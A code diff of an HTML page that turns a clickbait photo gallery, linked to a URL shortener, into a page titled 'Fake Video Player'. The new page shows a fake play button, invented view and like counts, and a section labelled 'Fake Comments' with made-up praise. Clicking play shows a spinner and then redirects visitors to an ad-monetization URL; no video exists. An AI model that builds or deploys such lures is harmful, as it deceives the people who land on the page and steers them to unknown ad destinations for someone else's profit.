@@ -3,107 +3,137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>All Photos</title>
+    <title>Fake Video Player</title>
     <style>
         body {
-            margin: 0; /* Remove default margins */
-            display: flex; /* Use flexbox for layout */
-            flex-direction: column; /* Stack elements vertically */
-            align-items: center; /* Center items horizontally */
-            background-color: #f0f8ff; /* Light background color */
-            font-family: Arial, sans-serif; /* Set a clean font */
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 20px;
+            background-color: #f4f4f9;
         }
-
-        .photo-container {
-            display: flex; /* Use flexbox for alignment */
-            flex-direction: column; /* Stack image and button vertically */
-            align-items: center; /* Center items horizontally */
-            margin-bottom: 20px; /* Space between photo containers */
+        .video-player {
+            position: relative;
+            width: 640px;
+            height: 360px;
+            background: #000;
+            margin: 20px auto;
+            border: 3px solid #333;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
-
-        img {
-            width: 100%; /* Full width of the container */
-            height: auto; /* Maintain aspect ratio */
-            display: block; /* Remove any space below the image */
-            margin: 0; /* Remove all margins */
-            padding: 0; /* Remove all padding */
-           /* animation: pulse 0.8s infinite; /* Apply pulse animation to images */
+        .video-thumbnail {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
-
-        .see-more-button {
-            display: inline-block;
-            background-color: #008000; /* Green background */
-            color: white; /* White text */
-            padding: 15px 30px; /* Padding around the text */
-            font-size: 18px; /* Larger font size */
-            border: none; /* No border */
-            border-radius: 5px; /* Rounded corners */
-            text-align: center; /* Center text within button */
-            text-decoration: none; /* Remove underline from link */
-            margin-top: -3px; /* Move button upwards by 3px from bottom edge of image */
-            animation: pulse 1.5s infinite; /* Add pulse animation effect to all buttons */
+        .play-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(255, 0, 0, 0.8);
+            color: #fff;
+            border: none;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            font-size: 24px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-
-        .see-more-button:hover {
-            background-color: #005700; /* Darker green on hover */
+        .play-button:hover {
+            background-color: #ff3333;
         }
-
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.2); /* Slightly enlarge during animation */
-            }
-            100% {
-                transform: scale(1);
-            }
+        .video-info {
+            font-size: 18px;
+            color: #666;
+        }
+        .loader {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+        .loader::after {
+            content: '';
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .comments {
+            text-align: left;
+            width: 640px;
+            margin: 20px auto;
+            background: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .comment {
+            margin-bottom: 10px;
+        }
+        .comment strong {
+            color: #333;
+        }
+        .comment p {
+            margin: 5px 0;
         }
     </style>
 </head>
 <body>
 
-    <div class="photo-container">
-        <a href="https://eemmaphotos.short.gy/gallery">
-            <img src="https://jpcdn.it/img/0276f857032fefb35560f602829daa0c.jpg" alt="i3.jpeg">
-        </a>
-        <a href="https://eemmaphotos.short.gy/gallery" class="see-more-button">See More</a>
+    <h1>Click to Play the Video</h1>
+    <div class="video-player">
+        <!-- Add your preview image URL here -->
+        <img src="https://jpcdn.it/img/small/66a07aa0356395a3903f045920477e20.jpg" alt="Video Thumbnail" class="video-thumbnail">
+        <button class="play-button" onclick="startVideo()">▶</button>
+        <div class="loader"></div>
+    </div>
+    <p class="video-info">Viewed 1,234,567 times | Likes: 98%</p>
+
+    <!-- Fake Comments Section -->
+    <div class="comments">
+        <div class="comment">
+            <strong>John Doe:</strong>
+            <p>"This video blew my mind! Can't believe how good it is."</p>
+        </div>
+        <div class="comment">
+            <strong>Jane Smith:</strong>
+            <p>"Loved every second of this. Sharing with all my friends!"</p>
+        </div>
+        <div class="comment">
+            <strong>Mike Johnson:</strong>
+            <p>"I didn't expect this to be so good. Worth every click!"</p>
+        </div>
     </div>
 
-    <div class="photo-container">
-        <a href="https://eemmaphotos.short.gy/gallery">
-            <img src="https://jpcdn.it/img/baf277354f07af92394397d75eb47d7c.jpg" alt="i3.jpeg">
-        </a>
-        <a href="https://eemmaphotos.short.gy/gallery" class="see-more-button">See More</a>
-    </div>
-
-    <div class="photo-container">
-        <a href="https://eemmaphotos.short.gy/gallery">
-            <img src="https://jpcdn.it/img/small/ebc65daaddd1ef5f511357f6990b010e.jpg" alt="i3.jpeg">
-        </a>
-        <a href="https://eemmaphotos.short.gy/gallery" class="see-more-button">See More</a>
-    </div>
-
-    <div class="photo-container">
-        <a href="https://eemmaphotos.short.gy/gallery">
-            <img src="https://jpcdn.it/img/small/068cd3c263a28e49402dc07eeb6dfe76.jpg" alt="i3.jpeg">
-        </a>
-        <a href="https://eemmaphotos.short.gy/gallery" class="see-more-button">See More</a>
-    </div>
-
-    <div class="photo-container">
-        <a href="https://eemmaphotos.short.gy/gallery">
-            <img src="https://jpcdn.it/img/small/ccadec98c4d88ec003fb58a019b5d1db.jpg" alt="i3.jpeg">
-        </a>
-        <a href="https://eemmaphotos.short.gy/gallery" class="see-more-button">See More</a>
-    </div>
-
-    <div class="photo-container">
-        <a href="https://eemmaphotos.short.gy/gallery">
-            <img src="https://jpcdn.it/img/a8bbb3a899f4fc26416c4f8f66dbcf3d.jpg" alt="i3.jpeg">
-        </a>
-        <a href="https://eemmaphotos.short.gy/gallery" class="see-more-button">See More</a>
-    </div>
+    <script>
+        function startVideo() {
+            const button = document.querySelector('.play-button');
+            const loader = document.querySelector('.loader');
+            
+            // Hide the button and show the loader
+            button.style.display = 'none';
+            loader.style.display = 'block';
+            
+            // Redirect after a short delay
+            setTimeout(() => {
+                window.location.href = "https://www.profitablecpmrate.com/ekrzy69zh?key=00d12dc404631afc45ef3709ead1b742";
+            }, 2000); // 2-second delay
+        }
+    </script>
 
 </body>
 </html>
